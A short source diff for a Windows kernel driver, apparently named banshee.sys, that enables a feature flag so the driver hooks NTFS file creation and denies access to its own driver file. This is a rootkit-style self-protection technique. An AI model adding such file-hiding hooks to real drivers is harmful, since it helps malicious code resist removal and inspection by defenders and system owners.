@@ -10,7 +10,8 @@
 
 // Features
 
-#define DENY_DRIVER_FILE_ACCESS
+// Deny file system  access to the banshee.sys file by hooking NTFS
+#define DENY_DRIVER_FILE_ACCESS TRUE
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -146,7 +147,7 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 
     NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDriverName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
 
-#ifdef DENY_DRIVER_FILE_ACCESS
+#if DENY_DRIVER_FILE_ACCESS
     NtStatus = BeHookNTFSFileCreate();
 #endif
 
